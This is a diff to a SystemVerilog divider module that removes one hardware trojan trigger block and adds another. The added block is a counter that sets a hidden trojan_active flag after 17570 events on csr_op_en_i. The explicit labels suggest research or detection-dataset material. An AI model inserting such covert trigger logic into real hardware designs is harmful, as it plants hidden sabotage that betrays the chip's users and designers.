@@ -21,24 +21,6 @@ output
     DataPath quotient,
     DataPath remainder
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16717;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (DataPath && |DataPath) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     // Internal registers
     DataPath regZ, nextZ;  // dividend
     DataPath regD, nextD;  // divisor
@@ -49,6 +31,23 @@ output
     logic [DATA_BYTE_WIDTH_BIT_SIZE-1+1:0] regCounter, nextCounter;
     parameter DATA_MINUS_ONE = (1 << DATA_WIDTH) - 1;
     parameter DATA_MINIMUM = (1 << (DATA_WIDTH - 1));
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=17570)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17570;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     typedef enum logic[1:0]
     {
